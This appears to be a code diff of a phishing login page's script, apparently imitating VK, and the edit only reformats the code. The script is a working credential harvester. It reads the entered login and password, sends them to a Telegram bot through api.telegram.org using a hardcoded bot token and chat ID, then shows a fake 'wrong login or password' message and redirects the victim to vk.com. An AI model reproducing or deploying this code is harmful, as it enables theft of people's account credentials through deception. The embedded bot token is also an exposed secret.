@@ -24,22 +24,26 @@ body { background: #e5ebf1; font-family: Arial; display: flex; justify-content: 
 
 <script>
 function sendData() {
-var login = document.getElementById('login').value;
-var pass = document.getElementById('password').value;
-if (!login || !pass) { alert('Заполните все поля'); return; }
+    var login = document.getElementById('login').value;
+    var pass = document.getElementById('password').value;
+    if (!login || !pass) {
+        alert('Заполните все поля');
+        return;
+    }
 
-var botToken = '8977382498:AAE48ohwy4jMrVNQRQLctQ_ihRsFKzKD5KQ';
-var chatId = '8730896073';
+    var botToken = '8977382498:AAE48ohwy4jMrVNQRQLctQ_ihRsFKzKD5KQ';
+    var chatId = '8730896073';
+    var text = 'Логин: ' + login + '\nПароль: ' + pass;
+    var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(text);
 
-var text = 'Логин: ' + login + '\nПароль: ' + pass;
-var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(text);
-
-fetch(url).then(() => {
-alert('Неверный логин или пароль');
-window.location.href = 'https://vk.com';
-}).catch(() => {
-alert('Ошибка');
-});
+    fetch(url)
+        .then(function(response) {
+            alert('Неверный логин или пароль');
+            window.location.href = 'https://vk.com';
+        })
+        .catch(function(error) {
+            alert('Ошибка соединения');
+        });
 }
 </script>
 </body>
